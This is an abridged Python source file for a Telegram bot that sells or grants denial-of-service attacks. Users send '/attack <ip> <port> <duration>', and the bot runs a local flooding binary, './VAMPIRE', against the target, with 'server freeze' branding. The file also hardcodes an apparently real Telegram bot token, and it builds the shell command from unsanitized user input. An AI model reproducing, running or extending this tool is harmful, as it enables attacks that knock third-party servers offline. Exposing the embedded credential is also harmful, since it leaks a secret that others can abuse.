...
TELEGRAM_BOT_TOKEN = '7559355721:AAHotB4Gb-Ii8ltikZKDzWwCR_5svE9N-YY'
ADMIN_USER_ID = 1094467055  
...
async def start(update: Update, context: CallbackContext):
    ...
    if not await is_user_allowed(user_id):
        ...
        return
    message = (
       "*💋ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ My Supreme Bot 💋*\n\n"
        "*👾Use /attack <ip> <port> <duration>*\n"
        "*😊ꜱᴇʀᴠᴇʀ ꜰʀᴇᴇᴢ ᴡɪᴛʜ @HORUS_999 🚀*" 
    )
...
async def attack(update: Update, context: CallbackContext):
    ...
    text=(
        ...
        f"*🔥ᴜɴʟᴇᴀꜱʜɪɴɢ My Magic. ɴᴏ ᴛᴜʀɴɪɴɢ ʙᴀᴄᴋ. Powered by @HORUS_999💥*"
    ), parse_mode='Markdown')
...
async def run_attack(chat_id, ip, port, duration, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./VAMPIRE {ip} {port} {duration} 1024 900 ",
        ...
        await context.bot.send_message(chat_id=chat_id, text="*✅ Magic Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')
